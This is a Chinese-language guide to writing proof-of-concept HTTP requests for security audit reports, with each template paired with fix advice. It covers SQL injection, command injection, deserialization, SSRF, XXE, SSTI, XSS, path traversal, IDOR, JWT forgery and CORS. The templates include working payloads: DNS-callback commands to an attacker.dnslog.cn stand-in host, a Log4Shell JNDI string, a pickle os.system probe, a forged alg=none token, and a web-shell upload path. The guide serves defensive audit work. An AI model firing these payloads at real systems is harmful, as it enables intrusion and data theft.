# PoC 生成指南

> 每个 Critical/High 漏洞应附有完整 HTTP 数据包格式的 PoC，帮助开发团队理解和复现风险。

---

## PoC 生成原则

```
1. 无害化: PoC 仅证明可达性，不造成破坏（优先用 sleep/DNS 外带）
2. 完整性: 包含完整的 HTTP 请求（方法/路径/请求头/请求体）
3. 可复现: 可直接粘贴到 Burp Repeater / curl 中使用
4. 含修复: 每个 PoC 后附修复建议和安全代码示例
```

---

## HTTP 数据包书写规范

所有 PoC 统一用以下格式，可直接导入 Burp Suite / Yakit：

```http
POST /api/endpoint HTTP/1.1
Host: <target-host>
Content-Type: application/json
Authorization: Bearer <token>
Cookie: session=<session-id>

{"key": "value"}
```

**注意**：
- `<target-host>` 等占位符用尖括号标注
- 敏感值用 `<token>` `<session-id>` 替代
- 无害 payload 用注释 `# 无害: 仅触发延迟/DNS` 标注

---

## 按漏洞类型的 PoC 模板

### SQL 注入

```http
# PoC-01: 布尔盲注
GET /api/users?id=1'+AND+'1'='1 HTTP/1.1
Host: <target-host>
Cookie: session=<session-id>

# 预期: 正常返回 → 确认注入点
```

```http
# PoC-02: 时间盲注 (无害: 仅延迟)
GET /api/users?id=1'+AND+SLEEP(3)-- HTTP/1.1
Host: <target-host>
Cookie: session=<session-id>

# 预期: 响应延迟 3 秒
```

```http
# PoC-03: UNION 注入
GET /api/users?id=-1+UNION+SELECT+1,user(),3,4-- HTTP/1.1
Host: <target-host>
Cookie: session=<session-id>

# 预期: 返回数据库用户名
```

```http
# PoC-04: MyBatis ${} ORDER BY 注入 (Java)
GET /api/users?sort=id,(SELECT+1+FROM+pg_sleep(3))-- HTTP/1.1
Host: <target-host>
Authorization: Bearer <token>

# 预期: 响应延迟 3 秒
```

**修复**: 参数绑定 `#{}` / ORDER BY 白名单验证

### 命令注入 / RCE

```http
# PoC-05: 命令注入 — 时间延迟 (无害)
POST /api/ping HTTP/1.1
Host: <target-host>
Content-Type: application/json
Authorization: Bearer <token>

{"host": "127.0.0.1;sleep 3"}

# 预期: 响应延迟 3 秒
```

```http
# PoC-06: 命令注入 — DNS 外带 (无害)
POST /api/network/check HTTP/1.1
Host: <target-host>
Content-Type: application/json

{"target": "127.0.0.1$(nslookup poc.attacker.dnslog.cn)"}

# 预期: dnslog 平台收到 DNS 解析记录
```

```http
# PoC-07: 命令注入 — 多种分隔符
POST /api/tools/traceroute HTTP/1.1
Host: <target-host>
Content-Type: application/json

{"ip": "127.0.0.1|id"}
# 或
{"ip": "127.0.0.1`id`"}
# 或
{"ip": "$(id)"}
```

**修复**: `shell=False` + 数组参数 / `shlex.quote()` / IP 格式白名单

### 反序列化

```http
# PoC-08: Java 反序列化 — URLDNS 链 (无害: 仅触发 DNS)
POST /api/import HTTP/1.1
Host: <target-host>
Content-Type: application/octet-stream

<URLDNS_SERIALIZED_PAYLOAD>

# 生成方式: java -jar ysoserial.jar URLDNS "http://poc.attacker.dnslog.cn"
# 预期: dnslog 收到 DNS 记录 = ObjectInputStream.readObject() 可达
```

```http
# PoC-09: Fastjson 反序列化
POST /api/data HTTP/1.1
Host: <target-host>
Content-Type: application/json

{"@type":"java.net.Inet4Address","val":"poc.attacker.dnslog.cn"}

# 预期: dnslog 收到 DNS 记录 = Fastjson autotype 开启
```

```http
# PoC-10: JNDI 注入 (Log4Shell 类)
GET /api/search HTTP/1.1
Host: <target-host>
X-Forwarded-For: ${jndi:ldap://poc.attacker.dnslog.cn/a}
User-Agent: ${jndi:ldap://poc.attacker.dnslog.cn/a}

# 预期: dnslog 收到 DNS 记录
```

```python
# PoC-11: Python Pickle RCE 检测 (无害 DNS 探测)
import pickle, os

class Probe:
    def __reduce__(self):
        return (os.system, ('nslookup poc.attacker.dnslog.cn',))

# 将 pickle.dumps(Probe()) 的结果 POST 到目标接口
```

### SSRF

```http
# PoC-12: SSRF — 内网端口探测
POST /api/proxy HTTP/1.1
Host: <target-host>
Content-Type: application/json
Authorization: Bearer <token>

{"url": "http://127.0.0.1:6379"}

# 预期: 返回 Redis 响应 = SSRF
```

```http
# PoC-13: SSRF — 协议探测
POST /api/fetch HTTP/1.1
Host: <target-host>
Content-Type: application/json

{"url": "file:///etc/hostname"}

# 预期: 返回主机名 = 支持 file 协议
```

```http
# PoC-14: SSRF — DNS 外带 (无害)
POST /api/webhook HTTP/1.1
Host: <target-host>
Content-Type: application/json

{"callback": "http://poc.attacker.dnslog.cn"}

# 预期: dnslog 收到请求 = 服务端发起了外部请求
```

**修复**: URL 白名单 + 内网 IP 黑名单 (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) + 协议限制 (仅 http/https)

### XXE

```http
# PoC-15: XXE — 读取文件
POST /api/import HTTP/1.1
Host: <target-host>
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>&xxe;</root>

# 预期: 返回内容包含主机名
```

```http
# PoC-16: XXE — OOB 外带 (无害)
POST /api/parse HTTP/1.1
Host: <target-host>
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://poc.attacker.dnslog.cn">
]>
<root>&xxe;</root>

# 预期: dnslog 收到请求
```

**修复**: `dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`

### SSTI 模板注入

```http
# PoC-17: Jinja2 (Python Flask)
GET /page?name={{7*7}} HTTP/1.1
Host: <target-host>

# 预期: 返回 49 而非 {{7*7}}
```

```http
# PoC-18: Velocity/FreeMarker (Java)
GET /render?tpl=${7*7} HTTP/1.1
Host: <target-host>

# 预期: 返回 49
```

```http
# PoC-19: Jinja2 进阶 — 读取配置 (无害)
GET /page?name={{config.items()}} HTTP/1.1
Host: <target-host>

# 预期: 返回 Flask 配置项
```

### XSS

```http
# PoC-20: 反射型 XSS
GET /search?q=<img/src=x+onerror=alert(document.domain)> HTTP/1.1
Host: <target-host>
Cookie: session=<session-id>

# 预期: 页面弹出当前域名
```

```http
# PoC-21: 存储型 XSS
POST /api/comment HTTP/1.1
Host: <target-host>
Content-Type: application/json
Authorization: Bearer <token>

{"content": "<img src=x onerror=alert(document.domain)>"}

# 预期: 其他用户访问该评论时弹框
```

```http
# PoC-22: DOM XSS (innerHTML)
# 检查 JS 代码中:
#   el.innerHTML = untrustedData
# 构造输入: <img src=x onerror=alert(1)>
# 注意: <script> 通过 innerHTML 插入不会执行，用事件属性绕过
```

### 路径遍历 / 任意文件读取

```http
# PoC-23: 路径遍历 — 读取文件
GET /api/file/download?path=../../../../etc/passwd HTTP/1.1
Host: <target-host>
Authorization: Bearer <token>

# 预期: 返回 /etc/passwd 内容
```

```http
# PoC-24: 路径遍历 — 双重编码绕过
GET /api/file?name=..%252f..%252f..%252fetc/passwd HTTP/1.1
Host: <target-host>

# 预期: 绕过单层 URL 解码过滤
```

```http
# PoC-25: 路径遍历 — 文件上传 + 写入任意路径
POST /api/upload HTTP/1.1
Host: <target-host>
Content-Type: multipart/form-data; boundary=------------------------boundary
Authorization: Bearer <token>

--------------------------boundary
Content-Disposition: form-data; name="file"; filename="../../../../tmp/poc.txt"
Content-Type: text/plain

PoC-test-content
--------------------------boundary--

# 预期: 文件被写入到 /tmp/poc.txt
# 变体: filename="../../../../var/www/html/shell.jsp"
```

```http
# PoC-26: Zip Slip (上传 zip 解压路径遍历)
POST /api/import/zip HTTP/1.1
Host: <target-host>
Content-Type: multipart/form-data; boundary=------------------------boundary

--------------------------boundary
Content-Disposition: form-data; name="file"; filename="malicious.zip"
Content-Type: application/zip

<ZIP_FILE_WITH_ENTRY: ../../tmp/poc.txt>
--------------------------boundary--

# 构造方式: 修改 zip 内文件条目名为 ../../tmp/poc.txt
```

**修复**: `Path.normalize()` + 验证路径不超出白名单目录 / 文件名过滤 `../`

### IDOR / 越权

```http
# PoC-27: 水平越权 — 访问他人数据
GET /api/user/10002/profile HTTP/1.1
Host: <target-host>
Authorization: Bearer <user-10001-token>

# 预期: 用 10001 的 token 能读取 10002 的数据 = IDOR
```

```http
# PoC-28: 水平越权 — 修改他人数据
PUT /api/order/ORD-20240315-10002 HTTP/1.1
Host: <target-host>
Content-Type: application/json
Authorization: Bearer <user-10001-token>

{"status": "cancelled"}

# 预期: 用 10001 的 token 能取消 10002 的订单 = IDOR
```

### 认证绕过 / JWT

```http
# PoC-29: JWT 算法篡改
GET /api/admin/users HTTP/1.1
Host: <target-host>
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

# 解码: {"alg":"none","typ":"JWT"}.{"user":"admin"}
# 预期: 服务端接受 alg=none 的 JWT = 认证绕过
```

```http
# PoC-30: JWT 弱密钥爆破
# 工具: hashcat -a 0 -m 16500 <jwt-token> rockyou.txt
# 爆破出密钥后重签 JWT，修改 role: admin
```

### CORS 配置错误

```http
# PoC-31: CORS — 任意 Origin 反射
GET /api/user/profile HTTP/1.1
Host: <target-host>
Origin: https://evil.attacker.com
Cookie: session=<session-id>

# 检查响应头:
# Access-Control-Allow-Origin: https://evil.attacker.com  ← 反射了恶意 Origin
# Access-Control-Allow-Credentials: true                  ← 允许携带凭证
# = 攻击者可从自己的页面读取受害者数据
```

### TLS / 加密问题

```
# PoC-32: TLS 证书验证禁用 (代码级)
# 定位代码: verify=False / InsecureSkipVerify / setHostnameVerifier
# 风险: MITM 攻击者可拦截/篡改加密通信
# 验证: 搭建自签名代理，观察客户端是否接受

# 修复:
# Python: requests.get(url, verify=True)
# Java:   使用默认 SSLContext，不自定义 TrustManager
# Go:     tls.Config{InsecureSkipVerify: false}
```

---

## PoC 书写模板

审计报告中每个 Critical/High 漏洞使用以下结构：

```markdown
### F-{编号}: {漏洞标题}

**等级**: 🔴 CRITICAL / 🟡 HIGH
**类型**: {CWE 编号} — {漏洞类型}
**位置**: `{文件名}:{行号}` → `{函数名}`
**前置条件**: {需要认证? 需要特定角色?}

**PoC**:

\```http
{完整 HTTP 请求}
\```

**预期结果**: {描述漏洞触发的表现}
**安全 payload 说明**: {解释为什么 PoC 是无害的}

**修复建议**:
\```{language}
{安全代码示例}
\```
```

